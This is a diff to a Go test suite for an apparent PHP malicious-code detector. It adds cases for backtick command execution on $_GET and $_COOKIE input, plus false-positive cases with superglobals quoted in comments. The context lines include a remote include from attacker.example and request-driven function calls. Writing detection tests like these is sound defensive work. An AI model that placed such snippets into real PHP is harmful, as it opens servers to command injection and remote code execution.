@@ -245,6 +245,12 @@ func TestThePreviouslyMissedShapesAreCaught(t *testing.T) {
 		{"variable function with request data", `<?php $f($_REQUEST['x']); ?>`},
 		{"include over http", `<?php include("http://attacker.example/x.txt"); ?>`},
 		{"backtick with request data", "<?php $out = `id {$_GET['u']}`;"},
+		// The concatenation shape. The assignment is too far from the backtick
+		// for the context group to reach it, so only the `.` alternative
+		// catches this one.
+		{"backtick after concatenation", "<?php $out = 'log: ' . `id {$_GET['u']}`;"},
+		{"backtick as an argument", "<?php file_put_contents($f, `id {$_GET['u']}`);"},
+		{"backtick with a cookie value", "<?php $out = `id {$_COOKIE['u']}`;"},
 		{"upload written as php", `<?php move_uploaded_file($tmp, $dir . '/x.php');`},
 	}
 	for _, c := range cases {
@@ -265,6 +271,13 @@ func TestDocumentedSuperglobalsAreNotBacktickExecution(t *testing.T) {
 		{"phpdoc type line", "<?php\n/**\n *     @type bool $test_form Whether the `$_POST['action']` parameter is as expected.\n */"},
 		{"inline comment", `<?php // reads ` + "`$_GET['id']`" + ` from the query string`},
 		{"a stray backtick far above a superglobal", "<?php\n// see `wp_list_table`\n$x = $_GET['id'];\n"},
+		// A sentence ends with a period and the next word is a backtick-quoted
+		// superglobal. This is why the concatenation context requires an
+		// OPERAND before the dot: a bare `.` alternative matches both of these.
+		{"phpdoc sentence ending before a quoted superglobal",
+			"<?php\n/**\n * Sanitises the input. `$_GET['id']` is unslashed first.\n */"},
+		{"inline comment ending before a quoted superglobal",
+			"<?php // handled above. `$_REQUEST['page']` is trusted here"},
 	}
 	for _, c := range documented {
 		t.Run(c.name, func(t *testing.T) {
